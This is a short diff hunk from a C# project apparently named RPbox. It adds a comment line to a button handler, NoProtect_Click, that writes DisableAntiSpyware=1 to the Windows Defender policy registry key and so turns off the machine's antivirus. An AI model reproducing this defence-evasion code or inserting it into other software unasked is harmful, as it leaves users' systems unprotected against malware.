@@ -654,6 +654,7 @@ namespace RPbox
         private void NoProtect_Click(object sender, EventArgs e)
         {
             //comit
+            //whatever shit
             //code to disable windows protection
             RegistryKey registrykey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\", true);
             registrykey.SetValue("DisableAntiSpyware", 1);
